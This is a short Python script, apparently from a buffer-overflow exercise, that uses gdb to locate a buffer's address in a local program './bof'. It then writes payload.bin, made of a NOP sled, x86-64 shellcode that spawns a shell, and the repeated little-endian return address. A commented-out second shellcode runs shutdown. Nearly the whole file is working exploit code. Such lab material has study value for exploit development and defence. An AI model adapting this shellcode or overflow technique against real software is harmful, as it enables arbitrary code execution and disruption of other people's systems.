#!/usr/bin/python3.10.6
import subprocess

shellcode = b"\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"  # opens bin/dash    

#Second shellcode for testing. It shutdowns the PC !
#shellcode = b"\x48\x31\xc0\x48\x31\xd2\x50\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x50\x66\x68\x2d\x68\x48\x89\xe1\x50\x49\xb8\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x49\xba\x73\x68\x75\x74\x64\x6f\x77\x6e\x41\x52\x41\x50\x48\x89\xe7\x52\x53\x51\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05" 

#the following lines open gdb and execute print &big_boy_buffer command to get the address of the buffer
output = subprocess.run(['gdb', '-q', './bof'], input='print &big_boy_buffer\nq\n', stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='ascii')
output = output.stdout.split("\n")

for i in output:
    if "big_boy_buffer" in i:
        address = i.split()[6]
        print(f"The address of big_boy_buffer is: {address}")
        big_boy_addr = address
bin_big_boy = bytes.fromhex(big_boy_addr[2:])

#reversing byte order (little endianess)
bin_big_boy = bin_big_boy[::-1]

#after writing 123 chars to buffer is the RIP register fully overwritten
distance = 123 
#we need distance - shellcode length - the return address (multiplied by x times to make sure that its written) No-ops so that shellcode can fit without overwriting RIP
nops = distance - len(shellcode) - 10*len(bin_big_boy)
hex_string = b"\x90"*nops  + shellcode + 10*bin_big_boy
binary_data = bytes.fromhex(''.join(format(b, '02x') for b in hex_string))

with open("payload.bin", "wb") as f:
    #fill first "nops" bytes with No-ops, creating a "slope" of No-ops (\x90) that leads to shellcode
    f.write(binary_data) 




